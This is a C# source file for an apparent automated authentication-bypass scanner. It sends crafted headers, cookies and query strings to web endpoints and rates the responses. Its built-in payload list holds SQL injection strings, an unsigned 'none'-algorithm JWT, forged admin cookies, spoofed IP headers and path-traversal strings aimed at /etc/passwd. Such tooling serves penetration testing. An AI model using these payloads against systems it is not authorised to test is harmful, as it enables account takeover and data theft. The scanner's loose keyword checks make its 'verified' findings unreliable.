using AttackAgent.Models;
using Serilog;
using System.Text.RegularExpressions;

namespace AttackAgent
{
    /// <summary>
    /// Authentication bypass testing engine
    /// Tests for various authentication bypass vulnerabilities
    /// </summary>
    public class AuthBypassEngine
    {
        private readonly SecurityHttpClient _httpClient;
        private readonly ILogger _logger;
        private readonly List<AuthBypassPayload> _payloads;

        public AuthBypassEngine()
        {
            _httpClient = new SecurityHttpClient();
            _logger = Log.ForContext<AuthBypassEngine>();
            _payloads = InitializeAuthBypassPayloads();
        }

        /// <summary>
        /// Tests all discovered endpoints for authentication bypass vulnerabilities
        /// </summary>
        public async Task<List<Vulnerability>> TestForAuthBypassAsync(ApplicationProfile profile)
        {
            var vulnerabilities = new List<Vulnerability>();
            
            _logger.Information("🔍 Starting authentication bypass testing...");
            _logger.Information("Testing {EndpointCount} endpoints with {PayloadCount} auth bypass payloads", 
                profile.DiscoveredEndpoints.Count, _payloads.Count);

            foreach (var endpoint in profile.DiscoveredEndpoints)
            {
                if (!IsTestableEndpoint(endpoint))
                    continue;

                _logger.Debug("Testing endpoint: {Method} {Path}", endpoint.Method, endpoint.Path);

                var endpointVulns = await TestEndpointForAuthBypassAsync(endpoint, profile.BaseUrl);
                vulnerabilities.AddRange(endpointVulns);
            }

            _logger.Information("Authentication bypass testing completed. Found {VulnCount} vulnerabilities", vulnerabilities.Count);
            return vulnerabilities;
        }

        /// <summary>
        /// Tests a specific endpoint for authentication bypass vulnerabilities
        /// </summary>
        private async Task<List<Vulnerability>> TestEndpointForAuthBypassAsync(EndpointInfo endpoint, string baseUrl)
        {
            var vulnerabilities = new List<Vulnerability>();
            var url = baseUrl.TrimEnd('/') + endpoint.Path;

            // Test each authentication bypass technique
            foreach (var payload in _payloads)
            {
                try
                {
                    var result = await TestAuthBypassAsync(url, endpoint.Method, payload);
                    
                    if (result.IsVulnerable)
                    {
                        var vulnerability = CreateAuthBypassVulnerability(endpoint, payload, result);
                        vulnerabilities.Add(vulnerability);
                        
                        _logger.Warning("🚨 Auth bypass found: {Method} {Path} with technique '{Technique}'", 
                            endpoint.Method, endpoint.Path, payload.Technique);
                    }
                }
                catch (Exception ex)
                {
                    _logger.Debug("Error testing auth bypass {Technique}: {Error}", payload.Technique, ex.Message);
                }
            }

            return vulnerabilities;
        }

        /// <summary>
        /// Tests authentication bypass with specific payload
        /// </summary>
        private async Task<AuthBypassResult> TestAuthBypassAsync(string url, string method, AuthBypassPayload payload)
        {
            var result = new AuthBypassResult
            {
                Payload = payload,
                IsVulnerable = false
            };

            try
            {
                // Get baseline response (should be unauthorized)
                var baselineResponse = await GetBaselineResponseAsync(url, method);
                result.BaselineResponse = baselineResponse;

                // Test with bypass payload
                var bypassResponse = await SendAuthBypassPayloadAsync(url, method, payload);
                result.BypassResponse = bypassResponse;

                // Analyze response for bypass indicators
                result.IsVulnerable = AnalyzeResponseForAuthBypass(baselineResponse, bypassResponse, payload);

                if (result.IsVulnerable)
                {
                    result.Confidence = CalculateAuthBypassConfidence(baselineResponse, bypassResponse, payload);
                    result.Evidence = ExtractAuthBypassEvidence(bypassResponse, payload);
                }
            }
            catch (Exception ex)
            {
                _logger.Debug("Error in auth bypass test: {Error}", ex.Message);
            }

            return result;
        }

        /// <summary>
        /// Gets baseline response without bypass payload
        /// </summary>
        private async Task<HttpResponse> GetBaselineResponseAsync(string url, string method)
        {
            return method.ToUpper() switch
            {
                "GET" => await _httpClient.GetAsync(url),
                "POST" => await _httpClient.PostAsync(url, "{}"),
                "PUT" => await _httpClient.PutAsync(url, "{}"),
                "DELETE" => await _httpClient.DeleteAsync(url),
                _ => await _httpClient.GetAsync(url)
            };
        }

        /// <summary>
        /// Sends authentication bypass payload
        /// </summary>
        private async Task<HttpResponse> SendAuthBypassPayloadAsync(string url, string method, AuthBypassPayload payload)
        {
            var headers = new Dictionary<string, string>();
            var body = "{}";

            // Apply bypass technique
            switch (payload.Technique)
            {
                case "Null Byte":
                    headers["Authorization"] = payload.Payload;
                    break;
                case "SQL Injection":
                    headers["Authorization"] = payload.Payload;
                    break;
                case "JWT Manipulation":
                    headers["Authorization"] = $"Bearer {payload.Payload}";
                    break;
                case "Header Injection":
                    headers["X-Forwarded-For"] = payload.Payload;
                    headers["X-Real-IP"] = payload.Payload;
                    break;
                case "Parameter Pollution":
                    var separator = url.Contains('?') ? "&" : "?";
                    url = $"{url}{separator}{payload.Payload}";
                    break;
                case "Method Override":
                    headers["X-HTTP-Method-Override"] = "GET";
                    break;
                case "Content-Type Bypass":
                    headers["Content-Type"] = payload.Payload;
                    break;
                case "User-Agent Bypass":
                    headers["User-Agent"] = payload.Payload;
                    break;
                case "Referer Bypass":
                    headers["Referer"] = payload.Payload;
                    break;
                case "Cookie Manipulation":
                    headers["Cookie"] = payload.Payload;
                    break;
            }

            return method.ToUpper() switch
            {
                "GET" => await _httpClient.GetAsync(url, headers),
                "POST" => await _httpClient.PostAsync(url, body, headers),
                "PUT" => await _httpClient.PutAsync(url, body, headers),
                "DELETE" => await _httpClient.DeleteAsync(url, headers),
                _ => await _httpClient.GetAsync(url, headers)
            };
        }

        /// <summary>
        /// Analyzes response for authentication bypass indicators
        /// </summary>
        private bool AnalyzeResponseForAuthBypass(HttpResponse baseline, HttpResponse bypass, AuthBypassPayload payload)
        {
            // Check if we got access when we shouldn't have
            if (baseline.StatusCode == System.Net.HttpStatusCode.Unauthorized && 
                bypass.StatusCode == System.Net.HttpStatusCode.OK)
                return true;

            if (baseline.StatusCode == System.Net.HttpStatusCode.Forbidden && 
                bypass.StatusCode == System.Net.HttpStatusCode.OK)
                return true;

            // Check for different response content
            if (baseline.StatusCode == bypass.StatusCode && 
                baseline.ContentLength != bypass.ContentLength && 
                bypass.ContentLength > baseline.ContentLength)
                return true;

            // Check for specific bypass indicators
            if (ContainsBypassIndicators(bypass.Content, payload))
                return true;

            return false;
        }

        /// <summary>
        /// Checks for specific bypass indicators in response
        /// </summary>
        private bool ContainsBypassIndicators(string content, AuthBypassPayload payload)
        {
            var indicators = new[]
            {
                "admin",
                "dashboard",
                "welcome",
                "success",
                "authenticated",
                "authorized",
                "user profile",
                "account settings",
                "logout",
                "session"
            };

            return indicators.Any(indicator => 
                content.ToLower().Contains(indicator));
        }

        /// <summary>
        /// Calculates confidence level for auth bypass vulnerability
        /// </summary>
        private double CalculateAuthBypassConfidence(HttpResponse baseline, HttpResponse bypass, AuthBypassPayload payload)
        {
            var confidence = 0.0;

            // High confidence for status code change
            if (baseline.StatusCode == System.Net.HttpStatusCode.Unauthorized && 
                bypass.StatusCode == System.Net.HttpStatusCode.OK)
                confidence += 0.9;

            if (baseline.StatusCode == System.Net.HttpStatusCode.Forbidden && 
                bypass.StatusCode == System.Net.HttpStatusCode.OK)
                confidence += 0.9;

            // Medium confidence for content change
            if (baseline.StatusCode == bypass.StatusCode && 
                bypass.ContentLength > baseline.ContentLength * 1.5)
                confidence += 0.6;

            // High confidence for bypass indicators
            if (ContainsBypassIndicators(bypass.Content, payload))
                confidence += 0.8;

            return Math.Min(confidence, 1.0);
        }

        /// <summary>
        /// Extracts evidence from the response
        /// </summary>
        private string ExtractAuthBypassEvidence(HttpResponse response, AuthBypassPayload payload)
        {
            var evidence = new List<string>();

            if (response.StatusCode == System.Net.HttpStatusCode.OK)
            {
                evidence.Add("Successfully bypassed authentication (200 OK)");
            }

            if (ContainsBypassIndicators(response.Content, payload))
            {
                evidence.Add("Authentication indicators found in response");
            }

            if (response.ContentLength > 1000)
            {
                evidence.Add($"Large response content ({response.ContentLength} bytes)");
            }

            return string.Join("; ", evidence);
        }

        /// <summary>
        /// Creates a vulnerability object from the test result
        /// </summary>
        private Vulnerability CreateAuthBypassVulnerability(EndpointInfo endpoint, AuthBypassPayload payload, AuthBypassResult result)
        {
            return new Vulnerability
            {
                Type = VulnerabilityType.AuthenticationBypass,
                Severity = DetermineAuthBypassSeverity(payload, result),
                Title = $"Authentication Bypass via {payload.Technique}",
                Description = $"Authentication bypass vulnerability found using {payload.Technique} technique.",
                Endpoint = endpoint.Path,
                Method = endpoint.Method,
                Payload = payload.Payload,
                Response = result.BypassResponse?.Content,
                Evidence = result.Evidence,
                Remediation = GetAuthBypassRemediation(payload),
                AttackMode = AttackMode.Aggressive,
                Confidence = result.Confidence,
                Verified = true
            };
        }

        /// <summary>
        /// Determines severity based on bypass technique and confidence
        /// </summary>
        private SeverityLevel DetermineAuthBypassSeverity(AuthBypassPayload payload, AuthBypassResult result)
        {
            if (result.Confidence >= 0.8)
                return SeverityLevel.Critical;
            else if (result.Confidence >= 0.6)
                return SeverityLevel.High;
            else
                return SeverityLevel.Medium;
        }

        /// <summary>
        /// Gets remediation advice for auth bypass vulnerability
        /// </summary>
        private string GetAuthBypassRemediation(AuthBypassPayload payload)
        {
            return "Implement proper authentication and authorization checks. Validate all input parameters and headers. " +
                   "Use secure session management and implement proper access controls. " +
                   "Regularly audit authentication mechanisms and test for bypass vulnerabilities.";
        }

        /// <summary>
        /// Checks if endpoint is suitable for auth bypass testing
        /// </summary>
        private bool IsTestableEndpoint(EndpointInfo endpoint)
        {
            // Test endpoints that might require authentication
            return endpoint.Path.Contains("/admin") || 
                   endpoint.Path.Contains("/api/") ||
                   endpoint.Path.Contains("/dashboard") ||
                   endpoint.Path.Contains("/user") ||
                   endpoint.Path.Contains("/profile") ||
                   endpoint.Path.Contains("/settings") ||
                   endpoint.RequiresAuthentication;
        }

        /// <summary>
        /// Initializes comprehensive auth bypass payload database
        /// </summary>
        private List<AuthBypassPayload> InitializeAuthBypassPayloads()
        {
            return new List<AuthBypassPayload>
            {
                // Null byte injection
                new AuthBypassPayload { Technique = "Null Byte", Payload = "admin%00", Description = "Null byte injection in authorization header" },
                new AuthBypassPayload { Technique = "Null Byte", Payload = "admin\0", Description = "Null byte injection" },

                // SQL injection in auth
                new AuthBypassPayload { Technique = "SQL Injection", Payload = "admin' OR '1'='1", Description = "SQL injection in authorization" },
                new AuthBypassPayload { Technique = "SQL Injection", Payload = "admin'--", Description = "SQL injection comment" },
                new AuthBypassPayload { Technique = "SQL Injection", Payload = "admin' OR 1=1--", Description = "SQL injection boolean" },

                // JWT manipulation
                new AuthBypassPayload { Technique = "JWT Manipulation", Payload = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.", Description = "JWT with none algorithm" },
                new AuthBypassPayload { Technique = "JWT Manipulation", Payload = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.invalid", Description = "JWT with invalid signature" },

                // Header injection
                new AuthBypassPayload { Technique = "Header Injection", Payload = "127.0.0.1", Description = "Localhost IP injection" },
                new AuthBypassPayload { Technique = "Header Injection", Payload = "admin", Description = "Admin user injection" },

                // Parameter pollution
                new AuthBypassPayload { Technique = "Parameter Pollution", Payload = "admin=1&user=admin", Description = "Parameter pollution" },
                new AuthBypassPayload { Technique = "Parameter Pollution", Payload = "role=admin&user=test", Description = "Role parameter pollution" },

                // Method override
                new AuthBypassPayload { Technique = "Method Override", Payload = "", Description = "HTTP method override" },

                // Content-Type bypass
                new AuthBypassPayload { Technique = "Content-Type Bypass", Payload = "application/x-www-form-urlencoded", Description = "Content-Type bypass" },
                new AuthBypassPayload { Technique = "Content-Type Bypass", Payload = "text/plain", Description = "Plain text bypass" },

                // User-Agent bypass
                new AuthBypassPayload { Technique = "User-Agent Bypass", Payload = "admin", Description = "Admin user agent" },
                new AuthBypassPayload { Technique = "User-Agent Bypass", Payload = "Mozilla/5.0 (compatible; AdminBot/1.0)", Description = "Admin bot user agent" },

                // Referer bypass
                new AuthBypassPayload { Technique = "Referer Bypass", Payload = "http://localhost/admin", Description = "Localhost referer" },
                new AuthBypassPayload { Technique = "Referer Bypass", Payload = "https://admin.example.com", Description = "Admin domain referer" },

                // Cookie manipulation
                new AuthBypassPayload { Technique = "Cookie Manipulation", Payload = "admin=1; role=admin", Description = "Admin cookie injection" },
                new AuthBypassPayload { Technique = "Cookie Manipulation", Payload = "authenticated=true; user=admin", Description = "Authentication cookie" },

                // Directory traversal
                new AuthBypassPayload { Technique = "Directory Traversal", Payload = "../../../etc/passwd", Description = "Directory traversal" },
                new AuthBypassPayload { Technique = "Directory Traversal", Payload = "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", Description = "Windows directory traversal" }
            };
        }

        public void Dispose()
        {
            _httpClient?.Dispose();
        }
    }

    /// <summary>
    /// Authentication bypass payload definition
    /// </summary>
    public class AuthBypassPayload
    {
        public string Technique { get; set; } = string.Empty;
        public string Payload { get; set; } = string.Empty;
        public string Description { get; set; } = string.Empty;
        public double SuccessRate { get; set; } = 0.0;
    }

    /// <summary>
    /// Result of authentication bypass test
    /// </summary>
    public class AuthBypassResult
    {
        public AuthBypassPayload Payload { get; set; } = new();
        public bool IsVulnerable { get; set; }
        public double Confidence { get; set; }
        public string Evidence { get; set; } = string.Empty;
        public HttpResponse? BaselineResponse { get; set; }
        public HttpResponse? BypassResponse { get; set; }
    }
}

